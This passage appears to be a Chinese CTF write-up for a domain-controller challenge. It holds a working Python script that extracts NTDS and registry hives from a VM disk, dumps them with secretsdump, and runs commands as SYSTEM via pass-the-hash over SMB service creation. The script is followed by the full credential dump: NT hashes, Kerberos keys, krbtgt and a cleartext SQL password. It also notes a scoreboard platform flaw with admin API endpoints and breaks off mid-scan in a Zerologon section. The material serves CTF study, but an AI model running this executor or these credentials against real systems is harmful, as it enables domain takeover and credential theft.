DEFAULT_VM_DIR = ROOT / "vm" / VM_NAME
DEFAULT_VDI = DEFAULT_VM_DIR / f"{VM_NAME}.vdi"
DEFAULT_VBOX_HOME = ROOT / ".vboxhome"
DEFAULT_OFFLINE_DIR = ROOT / "offline" / "hives"
DEFAULT_DUMP = ROOT / "artifacts_secretsdump.txt"
DEFAULT_WHOAMI = ROOT / "artifacts_system_whoami.txt"
DEFAULT_HOSTNAME = ROOT / "artifacts_system_hostname.txt"


def run_command(args, *, cwd=None, env=None, check=True, capture=True):
    proc = subprocess.run(
        args,
        cwd=cwd,
        env=env,
        check=False,
        capture_output=capture,
        text=True,
        encoding="utf-8",
        errors="backslashreplace",
    )
    if check and proc.returncode != 0:
        details = proc.stdout
        if proc.stderr:
            details = f"{details}\n{proc.stderr}" if details else proc.stderr
        raise RuntimeError(f"command failed ({proc.returncode}): {' '.join(map(str, args))}\n{details}".rstrip())
    return proc


def ensure_exists(path: Path, hint: str) -> None:
    if not path.exists():
        raise RuntimeError(f"missing required file: {path}\n{hint}")


def find_vboxmanage() -> Path:
    candidates = [
        Path(r"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"),
        Path(r"C:\Program Files\ldplayer9box\VBoxManage.exe"),
    ]
    for candidate in candidates:
        if candidate.exists():
            return candidate
    found = shutil.which("VBoxManage.exe") or shutil.which("VBoxManage")
    if found:
        return Path(found)
    raise RuntimeError("VBoxManage.exe not found. Install VirtualBox 7.2.0 or adjust PATH.")


def find_wsl() -> Path:
    found = shutil.which("wsl.exe")
    if not found:
        raise RuntimeError("wsl.exe not found. WSL with kali-linux is required for virt-copy-out.")
    return Path(found)


def find_secretsdump(default_python: Path) -> Path:
    candidates = [
        default_python.parent / "Scripts" / "secretsdump.py",
        Path(r"D:\Python\Python311\Scripts\secretsdump.py"),
    ]
    for candidate in candidates:
        if candidate.exists():
            return candidate
    raise RuntimeError("secretsdump.py not found. Install impacket for the Python interpreter you will use.")


def vbox(vboxmanage: Path, vbox_home: Path, *args: str) -> subprocess.CompletedProcess:
    env = os.environ.copy()
    env["VBOX_USER_HOME"] = str(vbox_home)
    return run_command([str(vboxmanage), *args], env=env)


def convert_to_wsl_path(path: Path) -> str:
    full = path.resolve()
    drive = full.drive[:1].lower()
    rest = full.as_posix()[2:]
    return f"/mnt/{drive}{rest}"


def ensure_ova_extracted(ova: Path, ovf: Path, vmdk: Path) -> None:
    ensure_exists(ova, "Place the challenge OVA in the current directory.")
    if ovf.exists() and vmdk.exists():
        return
    run_command(["tar", "-xf", str(ova), ovf.name, vmdk.name], cwd=ova.parent)


def ensure_vdi(vboxmanage: Path, vmdk: Path, vdi: Path) -> None:
    if vdi.exists():
        return
    vdi.parent.mkdir(parents=True, exist_ok=True)
    run_command([str(vboxmanage), "clonemedium", "disk", str(vmdk), str(vdi), "--format", "VDI"])


def ensure_vm_registered(vboxmanage: Path, vbox_home: Path, vm_dir: Path, vdi: Path) -> None:
    vm_dir.mkdir(parents=True, exist_ok=True)
    vbox_home.mkdir(parents=True, exist_ok=True)
    vbox(vboxmanage, vbox_home, "list", "systemproperties")
    vm_list = vbox(vboxmanage, vbox_home, "list", "vms").stdout
    vmx = vm_dir / f"{VM_NAME}.vbox"
    if f'"{VM_NAME}"' not in vm_list:
        if vmx.exists():
            vbox(vboxmanage, vbox_home, "registervm", str(vmx))
        else:
            vbox(vboxmanage, vbox_home, "createvm", "--name", VM_NAME, "--basefolder", str(ROOT / "vm"), "--ostype", "Windows2019_64", "--register")
            vbox(
                vboxmanage,
                vbox_home,
                "modifyvm",
                VM_NAME,
                "--memory",
                "2048",
                "--cpus",
                "1",
                "--firmware",
                "bios",
                "--ioapic",
                "on",
                "--pae",
                "off",
                "--vram",
                "128",
                "--graphicscontroller",
                "vboxsvga",
                "--boot1",
                "disk",
                "--boot2",
                "dvd",
                "--boot3",
                "none",
                "--boot4",
                "none",
                "--audio",
                "none",
            )
            vbox(vboxmanage, vbox_home, "storagectl", VM_NAME, "--name", "SATA", "--add", "sata", "--controller", "IntelAhci")

    info = vbox(vboxmanage, vbox_home, "showvminfo", VM_NAME, "--machinereadable").stdout
    if '"SATA-0-0"="none"' in info:
        vbox(
            vboxmanage,
            vbox_home,
            "storageattach",
            VM_NAME,
            "--storagectl",
            "SATA",
            "--port",
            "0",
            "--device",
            "0",
            "--type",
            "hdd",
            "--medium",
            str(vdi),
        )


def ensure_nat_rules(vboxmanage: Path, vbox_home: Path) -> None:
    forwards = [
        "http,tcp,127.0.0.1,18080,,80",
        "ldap,tcp,127.0.0.1,10389,,389",
        "mssql,tcp,127.0.0.1,11433,,1433",
        "smb,tcp,127.0.0.1,10445,,445",
    ]
    info = vbox(vboxmanage, vbox_home, "showvminfo", VM_NAME, "--machinereadable").stdout
    for rule in forwards:
        name = rule.split(",", 1)[0]
        pattern = re.compile(rf'^Forwarding\(\d+\)="{re.escape(name)},', re.MULTILINE)
        if not pattern.search(info):
            vbox(vboxmanage, vbox_home, "modifyvm", VM_NAME, "--natpf1", rule)


def get_vm_state(vboxmanage: Path, vbox_home: Path) -> str:
    info = vbox(vboxmanage, vbox_home, "showvminfo", VM_NAME, "--machinereadable").stdout
    match = re.search(r'^VMState="([^"]+)"$', info, re.MULTILINE)
    return match.group(1) if match else "unknown"


def restart_vm(vboxmanage: Path, vbox_home: Path, boot_wait: int) -> None:
    state = get_vm_state(vboxmanage, vbox_home)
    if state == "running":
        vbox(vboxmanage, vbox_home, "controlvm", VM_NAME, "poweroff")
        time.sleep(3)
    vbox(vboxmanage, vbox_home, "startvm", VM_NAME, "--type", "headless")
    time.sleep(boot_wait)


def copy_offline_hives(wsl_exe: Path, work_root: Path, offline_dir: Path, distro: str, vmdk: Path) -> None:
    offline_dir.mkdir(parents=True, exist_ok=True)
    wsl_root = convert_to_wsl_path(work_root)
    wsl_vmdk = convert_to_wsl_path(vmdk)
    script = "\n".join(
        [
            "set -e",
            f"cd '{wsl_root}'",
            "mkdir -p offline/hives",
            f"virt-copy-out -a '{wsl_vmdk}' /Windows/NTDS/ntds.dit offline/hives/",
            f"virt-copy-out -a '{wsl_vmdk}' /Windows/System32/config/SYSTEM offline/hives/",
            f"virt-copy-out -a '{wsl_vmdk}' /Windows/System32/config/SECURITY offline/hives/",
        ]
    )
    run_command([str(wsl_exe), "-u", "root", "-d", distro, "--", "bash", "-lc", script])


def run_secretsdump(python_exe: Path, secretsdump: Path, offline_dir: Path, dump_path: Path) -> None:
    system_hive = offline_dir / "SYSTEM"
    security_hive = offline_dir / "SECURITY"
    ntds = offline_dir / "ntds.dit"
    ensure_exists(system_hive, "Offline SYSTEM hive is required.")
    ensure_exists(security_hive, "Offline SECURITY hive is required.")
    ensure_exists(ntds, "Offline NTDS.dit is required.")
    proc = run_command(
        [
            str(python_exe),
            str(secretsdump),
            "-system",
            str(system_hive),
            "-security",
            str(security_hive),
            "-ntds",
            str(ntds),
            "LOCAL",
        ]
    )
    dump_path.write_text(proc.stdout, encoding="utf-8")


def read_text_auto(path: Path) -> str:
    raw = path.read_bytes()
    for encoding in ("utf-8", "utf-16", "utf-16-le", "utf-16-be", "gbk"):
        try:
            return raw.decode(encoding)
        except UnicodeDecodeError:
            continue
    return raw.decode("utf-8", errors="ignore")


def extract_hash_line(dump_path: Path, account: str) -> str:
    pattern = re.compile(rf"{re.escape(account)}:\d+:[0-9a-fA-F]{{32}}:[0-9a-fA-F]{{32}}:::")
    for line in read_text_auto(dump_path).splitlines():
        match = pattern.search(line)
        if match:
            return match.group(0)
    raise RuntimeError(f"could not find hash line for {account} in {dump_path}")


def parse_hash_line(hash_line: str) -> tuple[str, str]:
    parts = hash_line.strip().split(":")
    if len(parts) < 4:
        raise RuntimeError(f"invalid hash line: {hash_line}")
    return parts[2], parts[3]


def random_tag(prefix: str, length: int = 8) -> str:
    return prefix + "".join(random.choice(string.ascii_letters) for _ in range(length))


def escape_for_cmd_echo(command: str) -> str:
    replacements = {
        "^": "^^",
        "&": "^&",
        "<": "^<",
        ">": "^>",
        "|": "^|",
    }
    escaped = []
    for char in command:
        escaped.append(replacements.get(char, char))
    return "".join(escaped)


def smbexec_one_shot(
    *,
    target_name: str,
    target_ip: str,
    smb_port: int,
    domain: str,
    username: str,
    password: str,
    lmhash: str,
    nthash: str,
    command: str,
) -> str:
    stringbinding = rf"ncacn_np:{target_name}[\pipe\svcctl]"
    rpc_transport = transport.DCERPCTransportFactory(stringbinding)
    rpc_transport.setRemoteHost(target_ip)
    rpc_transport.set_dport(smb_port)
    rpc_transport.set_credentials(username, password, domain, lmhash, nthash, None)

    dce = rpc_transport.get_dce_rpc()
    dce.connect()
    dce.bind(scmr.MSRPC_UUID_SCMR)

    smb_conn = rpc_transport.get_smb_connection()
    smb_conn.setTimeout(100000)

    scm_handle = scmr.hROpenSCManagerW(dce)["lpScHandle"]
    service_name = random_tag("svc")
    output_name = random_tag("out") + ".txt"
    batch_name = random_tag("job") + ".bat"
    output_path = rf"C:\Windows\Temp\{output_name}"
    batch_path = rf"C:\Windows\Temp\{batch_name}"
    batch_body = f"{escape_for_cmd_echo(command)} ^> {output_path} 2^>^&1"
    binary_path = (
        rf"C:\Windows\System32\cmd.exe /Q /c "
        rf"echo {batch_body} > {batch_path} & "
        rf"C:\Windows\System32\cmd.exe /Q /c {batch_path} & "
        rf"del {batch_path}"
    )

    service_handle = None
    try:
        resp = scmr.hRCreateServiceW(
            dce,
            scm_handle,
            service_name,
            service_name,
            lpBinaryPathName=binary_path,
            dwStartType=scmr.SERVICE_DEMAND_START,
        )
        service_handle = resp["lpServiceHandle"]
        try:
            scmr.hRStartServiceW(dce, service_handle)
        except Exception:
            pass

        time.sleep(1)

        last_error = None
        for _ in range(30):
            try:
                chunks = []

                def callback(data: bytes) -> None:
                    chunks.append(data)

                smb_conn.getFile("ADMIN$", rf"Temp\{output_name}", callback)
                output = b"".join(chunks).decode("utf-8", errors="backslashreplace")
                if output.strip():
                    smb_conn.deleteFile("ADMIN$", rf"Temp\{output_name}")
                    return output
            except Exception as exc:
                last_error = exc
            time.sleep(1)
        raise RuntimeError(f"timed out waiting for remote output file {output_name}: {last_error}")
    finally:
        if service_handle is not None:
            try:
                scmr.hRDeleteService(dce, service_handle)
            except Exception:
                pass
            try:
                scmr.hRCloseServiceHandle(dce, service_handle)
            except Exception:
                pass
        try:
            scmr.hRCloseServiceHandle(dce, scm_handle)
        except Exception:
            pass
        try:
            dce.disconnect()
        except Exception:
            pass


def extract_proof(output: str, command: str) -> str:
    cleaned = re.sub(r"[\x00-\x08\x0b-\x1f]", "", output)
    if command == "whoami":
        match = re.search(r"(?im)^\s*(nt authority\\system)\s*$", cleaned)
    elif command == "hostname":
        match = re.search(r"(?im)^\s*(CASTLEVANIA)\s*$", cleaned)
    else:
        match = None
    if not match:
        raise RuntimeError(f"failed to extract proof line for {command}")
    return match.group(1)


def verify_shell(
    *,
    dump_path: Path,
    hash_line: str | None,
    domain: str,
    username: str,
    target_name: str,
    target_ip: str,
    smb_port: int,
    whoami_path: Path,
    hostname_path: Path,
    retries: int,
    retry_delay: int,
) -> tuple[str, str]:
    if not hash_line:
        ensure_exists(dump_path, "Run the full mode first or provide --hash-line.")
        hash_line = extract_hash_line(dump_path, username)

    lmhash, nthash = parse_hash_line(hash_line)
    identity = f"{domain}/{username}@{target_name}"
    print(f"[*] principal : {identity}")
    print(f"[*] target ip : {target_ip}:{smb_port}")
    print(f"[*] hashes    : {lmhash}:{nthash}")

    def run_with_retry(command: str) -> str:
        last_error = None
        for attempt in range(1, retries + 1):
            try:
                return smbexec_one_shot(
                    target_name=target_name,
                    target_ip=target_ip,
                    smb_port=smb_port,
                    domain=domain,
                    username=username,
                    password="",
                    lmhash=lmhash,
                    nthash=nthash,
                    command=command,
                )
            except Exception as exc:
                last_error = exc
                if attempt == retries:
                    break
                print(f"[*] retry {attempt}/{retries - 1} for {command}: {exc}")
                time.sleep(retry_delay)
        raise RuntimeError(f"{command} failed after {retries} attempts: {last_error}")

    whoami_output = run_with_retry("whoami")
    whoami_path.write_text(whoami_output, encoding="utf-8")
    whoami = extract_proof(whoami_output, "whoami")
    print(f"[+] whoami    : {whoami}")

    hostname_output = run_with_retry("hostname")
    hostname_path.write_text(hostname_output, encoding="utf-8")
    hostname = extract_proof(hostname_output, "hostname")
    print(f"[+] hostname  : {hostname}")

    return whoami, hostname


def do_full(args) -> int:
    python_exe = args.python.resolve()
    vboxmanage = args.vboxmanage.resolve() if args.vboxmanage else find_vboxmanage()
    wsl_exe = args.wsl.resolve() if args.wsl else find_wsl()
    secretsdump = args.secretsdump.resolve() if args.secretsdump else find_secretsdump(python_exe)

    ensure_exists(python_exe, "Use a Python interpreter with impacket installed.")

    args.vbox_home.mkdir(parents=True, exist_ok=True)
    args.offline_dir.mkdir(parents=True, exist_ok=True)
    (ROOT / "vm").mkdir(parents=True, exist_ok=True)

    print("[*] extracting OVA if needed")
    ensure_ova_extracted(args.ova, args.ovf, args.vmdk)

    print("[*] preparing VDI")
    ensure_vdi(vboxmanage, args.vmdk, args.vdi)

    print("[*] registering VM")
    ensure_vm_registered(vboxmanage, args.vbox_home, args.vm_dir, args.vdi)

    print("[*] setting NAT forwards")
    ensure_nat_rules(vboxmanage, args.vbox_home)

    print("[*] starting VM")
    restart_vm(vboxmanage, args.vbox_home, args.boot_wait)

    print("[*] copying offline hives from VMDK")
    copy_offline_hives(wsl_exe, ROOT, args.offline_dir, args.wsl_distro, args.vmdk)

    print("[*] running secretsdump")
    run_secretsdump(python_exe, secretsdump, args.offline_dir, args.dump)

    print("[*] verifying Administrator shell")
    whoami, hostname = verify_shell(
        dump_path=args.dump,
        hash_line=args.hash_line,
        domain=args.domain,
        username=args.user,
        target_name=args.target,
        target_ip=args.target_ip,
        smb_port=args.smb_port,
        whoami_path=args.whoami_out,
        hostname_path=args.hostname_out,
        retries=args.verify_retries,
        retry_delay=args.verify_delay,
    )
    print(f"[+] complete   : {whoami} @ {hostname}")
    return 0


def do_verify(args) -> int:
    print("[*] verifying Administrator shell")
    whoami, hostname = verify_shell(
        dump_path=args.dump,
        hash_line=args.hash_line,
        domain=args.domain,
        username=args.user,
        target_name=args.target,
        target_ip=args.target_ip,
        smb_port=args.smb_port,
        whoami_path=args.whoami_out,
        hostname_path=args.hostname_out,
        retries=args.verify_retries,
        retry_delay=args.verify_delay,
    )
    print(f"[+] complete   : {whoami} @ {hostname}")
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="One-file local reproduction script for BabyDC.")
    parser.add_argument("--python", type=Path, default=Path(sys.executable), help="Python interpreter with impacket installed")
    parser.add_argument("--domain", default="XMCVE.local")
    parser.add_argument("--user", default="Administrator")
    parser.add_argument("--target", default="CASTLEVANIA.XMCVE.local")
    parser.add_argument("--target-ip", default="127.0.0.1")
    parser.add_argument("--smb-port", type=int, default=10445)
    parser.add_argument("--dump", type=Path, default=DEFAULT_DUMP)
    parser.add_argument("--hash-line", help="Explicit secretsdump line, overrides --dump in verify mode")
    parser.add_argument("--whoami-out", type=Path, default=DEFAULT_WHOAMI)
    parser.add_argument("--hostname-out", type=Path, default=DEFAULT_HOSTNAME)
    parser.add_argument("--verify-retries", type=int, default=12, help="Retry count for post-boot shell validation")
    parser.add_argument("--verify-delay", type=int, default=5, help="Seconds between shell validation retries")

    subparsers = parser.add_subparsers(dest="mode", required=True)

    full = subparsers.add_parser("full", help="Extract the disk, boot the VM, dump hashes, and verify SYSTEM execution")
    full.add_argument("--ova", type=Path, default=DEFAULT_OVA)
    full.add_argument("--ovf", type=Path, default=DEFAULT_OVF)
    full.add_argument("--vmdk", type=Path, default=DEFAULT_VMDK)
    full.add_argument("--vm-dir", type=Path, default=DEFAULT_VM_DIR)
    full.add_argument("--vdi", type=Path, default=DEFAULT_VDI)
    full.add_argument("--vbox-home", type=Path, default=DEFAULT_VBOX_HOME)
    full.add_argument("--offline-dir", type=Path, default=DEFAULT_OFFLINE_DIR)
    full.add_argument("--vboxmanage", type=Path, help="Override VBoxManage.exe")
    full.add_argument("--wsl", type=Path, help="Override wsl.exe")
    full.add_argument("--wsl-distro", default="kali-linux")
    full.add_argument("--secretsdump", type=Path, help="Override secretsdump.py")
    full.add_argument("--boot-wait", type=int, default=25, help="Seconds to wait after starting the VM")
    full.set_defaults(func=do_full)

    verify = subparsers.add_parser("verify", help="Use the dump or a hash line to prove SYSTEM execution")
    verify.set_defaults(func=do_verify)

    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    return args.func(args)


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise
```

## 相关附件
### artifacts_system_hostname.txt
```plain
CASTLEVANIA
```

### artifacts_system_whoami.txt
```plain
nt authority\system
```

### artifacts_secretsdump.txt
```plain
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xf2092dc6a831d956236d0531aac2cb1e
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:11cb3c4d8f86935bed6308e80267da7188de855a9bd5eb2cf282721961fef8645f6282f99245aa4c7bd3ac00370369878d9e31b351f7f0442d3ccb684b1466ffedb013b00d78aab76342cee24a7159c28252956af96ce5047b57c39db55ae5d52c3796e376b11491ad9b5b8e16cb63f93cf5fd3331ff0c5d19d1c35afd507da04bb6fe4e1cf57fb9ac3fa18ec5a6e9569067539b1960d5916689367165a357daec0a0d0f7ceca9f2a5cc2e59f6c8bfd3d148aaa5fd986b551fac6f480a58e0f0f47a99855cc524fe38189dbe2b564b6ed450789d75abe4d3bc25da0a019af44475d8ee15c3c635d31291e4ff1ef1b715
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:85ef092d9016422943e90d8a9dd7be0d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x36c74f42ecd9620cabba2b23437069ee9cb02c66
dpapi_userkey:0x07abeab07fdc1b473c27cd2cf198aff60f5b2cca
[*] NL$KM 
 0000   ED 59 C8 EA A7 3E E2 5B  27 80 59 7D 40 D0 19 66   .Y...>.['.Y}@..f
 0010   78 A5 9C 7B 41 23 C4 C4  E2 DD 86 D2 50 B8 60 5C   x..{A#......P.`\
 0020   30 D1 98 7C E6 22 53 F8  A2 F9 7C 45 54 54 47 8A   0..|."S...|ETTG.
 0030   46 C5 D6 95 10 EE 4E B4  90 0D 2D 46 43 51 9B 82   F.....N...-FCQ..
NL$KM:ed59c8eaa73ee25b2780597d40d0196678a59c7b4123c4c4e2dd86d250b8605c30d1987ce62253f8a2f97c455454478a46c5d69510ee4eb4900d2d4643519b82
[*] _SC_MSSQLSERVER 
(Unknown User):Sql!2026
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 71fcd688bf7bd2e18810d37d775b09a2
[*] Reading and decrypting hashes from D:\CTFGAME\2026polarisctf\xd5\xd0\xd0\xc2\xc8\xfc\web\DC\offline\hives\ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Alucard:1000:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
CASTLEVANIA$:1001:aad3b435b51404eeaad3b435b51404ee:85ef092d9016422943e90d8a9dd7be0d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1e3c4fe72e1383c576b4b3aeef4730a8:::
XMCVE.local\p2zhh:1104:aad3b435b51404eeaad3b435b51404ee:bc2bf43119e258bcecf71d44abc29db7:::
XMCVE.local\mowen:1105:aad3b435b51404eeaad3b435b51404ee:efb5fa49a38497a71e144f690860688e:::
XMCVE.local\sales:1106:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
XMCVE.local\support:1107:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
XMCVE.local\it:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
XMCVE.local\hr:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
XMCVE.local\admin:1110:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
XMCVE.local\sqlsvc:1112:aad3b435b51404eeaad3b435b51404ee:d93ef04edb808c5bce3a5bd67b936ca9:::
[*] Kerberos keys from D:\CTFGAME\2026polarisctf\xd5\xd0\xd0\xc2\xc8\xfc\web\DC\offline\hives\ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:13e54f64708d675c0a54eb4b40e2ca21b2fcb3e6298969d741fc6e70a9367786
Administrator:aes128-cts-hmac-sha1-96:aafdd9e5c02b41dece2a83b2d9b4439c
Administrator:des-cbc-md5:80584683e63d5845
Alucard:aes256-cts-hmac-sha1-96:638ca0d75cc190cb5e378f1763dcb62c86e72b88c3daea8b4fbe22071cfe38c2
Alucard:aes128-cts-hmac-sha1-96:af36315453c02abbe2c811ee7fdc5b56
Alucard:des-cbc-md5:585e80b09b6eb561
CASTLEVANIA$:aes256-cts-hmac-sha1-96:b650b664422d901bed18c2db4486fcab456fb43bf134a8c492770af8745e7997
CASTLEVANIA$:aes128-cts-hmac-sha1-96:e52275afd361ca21055702953af73856
CASTLEVANIA$:des-cbc-md5:c2944afee591b594
krbtgt:aes256-cts-hmac-sha1-96:2392ad160e585e1448c5ca4623b9ad48789c267c6488a0074dd86e98457fb5fc
krbtgt:aes128-cts-hmac-sha1-96:7d55d129c8fe6c50aa87cb542775f0a0
krbtgt:des-cbc-md5:e570376eb538c132
XMCVE.local\p2zhh:aes256-cts-hmac-sha1-96:ded2395cf838fe474403b924638ba43ab5bf6f86f6924a172f42158f89523f58
XMCVE.local\p2zhh:aes128-cts-hmac-sha1-96:a8bf626e448308048849c8c607846308
XMCVE.local\p2zhh:des-cbc-md5:386df4e008e96813
XMCVE.local\mowen:aes256-cts-hmac-sha1-96:15163711bf2b1f9b5292a92e92b04a5985e1cb4af3f39c02eec442acf69f8268
XMCVE.local\mowen:aes128-cts-hmac-sha1-96:fab8fe129984295f18a99dcf365e654c
XMCVE.local\mowen:des-cbc-md5:231c7a2a3708029d
XMCVE.local\sales:aes256-cts-hmac-sha1-96:16ca24589ae3946d2703f01517ce6690ba5f047caee666ac1d8fb080818b38d9
XMCVE.local\sales:aes128-cts-hmac-sha1-96:b89a5e96aa707640658d8cd44346d373
XMCVE.local\sales:des-cbc-md5:735125852ad66dd6
XMCVE.local\support:aes256-cts-hmac-sha1-96:18b8e74980ad358e873dd99697c2e03c45cba28d44fda669cb311228fce34f74
XMCVE.local\support:aes128-cts-hmac-sha1-96:ec7850f423890ba5c01a4968e18916f9
XMCVE.local\support:des-cbc-md5:389bfee35e4f7620
XMCVE.local\it:aes256-cts-hmac-sha1-96:9a449caeff406780cd9d064fd51524df50eae35fcef19915a0ac5dfbd2afdaaf
XMCVE.local\it:aes128-cts-hmac-sha1-96:53ec1190fb189b97c666c2dc199a1132
XMCVE.local\it:des-cbc-md5:1c2686548a9d4a16
XMCVE.local\hr:aes256-cts-hmac-sha1-96:de4a4f2a15ef2a47f055791f5042a376090cee935dd1907f6efd8ca3bd4e8fa4
XMCVE.local\hr:aes128-cts-hmac-sha1-96:6bafbe4835641707bf1ea4f16510e016
XMCVE.local\hr:des-cbc-md5:ce9113948c738913
XMCVE.local\admin:aes256-cts-hmac-sha1-96:2e64fb40f4b6b9d9c280f7ff87a7f2c37167d53d28352684b2fd53cd3d9c135a
XMCVE.local\admin:aes128-cts-hmac-sha1-96:741a205f3dbe24d959f2ced9e7cfea8b
XMCVE.local\admin:des-cbc-md5:49d9c74562bca1ce
XMCVE.local\sqlsvc:aes256-cts-hmac-sha1-96:908e3dfe7822951cc25e6639a69a568708050cca32159836d83f977d982874fe
XMCVE.local\sqlsvc:aes128-cts-hmac-sha1-96:adbd4b00d8ac0d8d4f0b0f5a7ee3999b
XMCVE.local\sqlsvc:des-cbc-md5:e9a292087902f10d
[*] Cleaning up... 
```

## <font style="color:rgb(51, 51, 51);">最终答案</font>
<font style="color:rgb(51, 51, 51);">最终权限证明如下：</font>

```plain
whoami    -> nt authority\system
hostname  -> CASTLEVANIA
```

<font style="color:rgb(51, 51, 51);">对应证据文件为：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">artifacts_secretsdump.txt</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">artifacts_system_whoami.txt</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">artifacts_system_hostname.txt</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">proof_system.png</font>`

<font style="color:rgb(51, 51, 51);">如果只需要快速验证管理员 shell，不需要重新走完整链路，直接执行：</font>

D:\Python\Python311\python.exe .\babydc_unified.py --python D:\Python\Python311\python.exe verify

<font style="color:rgb(51, 51, 51);">如果需要从当前附件目录重新完整复现，直接执行：</font>

D:\Python\Python311\python.exe .\babydc_unified.py --python D:\Python\Python311\python.exe full

# 平台漏洞<font style="color:#333333;">（？？？</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">     </font>
## 漏洞描述
![](/image/myself%20machine/Castlevania-Unexpected-19.jpeg)

## 漏洞发现
> 接口写在前端中
>

![](/image/myself%20machine/Castlevania-Unexpected-20.png)

```plain
const He = "/information";
var Oe = (s => (s.getNoticeInfo = He + "/getNoticeInfo",
s.GetRankInfoRequest = He + "/getRankInfo",
s.getTop10TeamRankForLine = He + "/getTop10TeamRankForLine",
s.adminGetInformationLog = He + "/adminGetInformationLog",
s.getOriginalSolveLog = He + "/getOriginalSolveLog",
s.getTeamBaseInfoForRank = He + "/getTeamBaseInfoForRank",
s.getUserBaseInfoForRank = He + "/getUserBaseInfoForRank",
s.getInformationLog = He + "/getInformationLog",
s.getMyTeamTendencyForLine = He + "/getMyTeamTendencyForLine",
s.getIdentityBaseOfRank = He + "/getIdentityBaseOfRank",
s.getRecentSubmitLog = He + "/getRecentSubmitLog",
s.getMatchTeamAndUserCount = He + "/getMatchTeamAndUserCount",
s.getChallengeSolveCountRank = He + "/getChallengeSolveCountRank",
s.getTeamRankWithChallengeInfo = He + "/getTeamRankWithChallengeInfo",
s.adminGetFlagCheatLog = He + "/adminGetFlagCheatLog",
s.adminExportScore = He + "/adminExportScore",
s.getWriteupTemplate = He + "/getWriteUpTemplate",
s))(Oe || {});
const Sa = s => E.post(Oe.getNoticeInfo, s)
  , Zn = s => E.post(Oe.GetRankInfoRequest, s)
  , vm = () => E.get(Oe.getTop10TeamRankForLine)
  , ym = s => E.post(Oe.adminGetInformationLog, s)
  , zi = s => E.post(Oe.getTeamBaseInfoForRank, s)
  , wm = s => E.post(Oe.getUserBaseInfoForRank, s)
  , Qn = s => E.post(Oe.getInformationLog, s)
  , bm = () => E.get(Oe.getMyTeamTendencyForLine)
  , Nm = () => E.get(Oe.getIdentityBaseOfRank)
  , Di = () => E.get(Oe.getRecentSubmitLog)
  , _m = () => E.get(Oe.getMatchTeamAndUserCount)
  , Cm = () => E.get(Oe.getChallengeSolveCountRank)
  , Sm = s => E.post(Oe.getTeamRankWithChallengeInfo, s)
  , Ei = s => E.post(Oe.getOriginalSolveLog, s)
  , km = s => E.post(Oe.adminGetFlagCheatLog, s)
  , Lm = s => E.post(Oe.adminExportScore, s)
  , Mm = () => E.get(Oe.getWriteupTemplate)
  , Tm = (s, t) => E.post("/user/adminGetUserList", {
    page_and_size: s,
    name: t
})
  , Ri = s => E.post("/user/adminGetUserInfo", {
    id: s
})
  , Im = s => E.post("/user/getUserLoginLog", {
    id: s
})
  , Pm = s => E.post("/user/getUserSubmitLog", {
    id: s
})
  , jr = s => E.post("/user/adminChangeBanStatus", s)
  , Fm = s => E.post("/user/adminSyncUserAndTeamInfo", s)
  , vr = () => E.get("/user/getUserInfo")
```

## 漏洞复现
![](/image/myself%20machine/Castlevania-Unexpected-21.png)

![](/image/myself%20machine/Castlevania-Unexpected-22.png)

# scdyh<font style="color:#333333;">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">     </font>
## 端口扫描
```plain
| MIIDADCCAeigAwIBAgIQfKZK7ctznLZKnQZokrA1IzANBgkqhkiG9w0BAQUFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA | bABsAGIAYQBjAGswIBcNMjYwMzI4MDIwNjEzWhgPMjA1NjAzMjgwMjA2MTNaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMxRhfGS
| jzRvPpZEACdpj+rr3nY/v+rnj/6f9csEPa9jZp9KqHr/jricKUs1ZrH4aNsUUh7T | jmTbThIyELZ9VO38kxo3Mw1gsatZ1aD78UMiA1nqdFZc7KxFokRM8JquD8xlhiH7
| kELXCvrRQ0trXWAWFbXvUyuBR4aOAOVqq3Hy5DmPdc+MrL1QmGGhRWa2EgiaL9vE
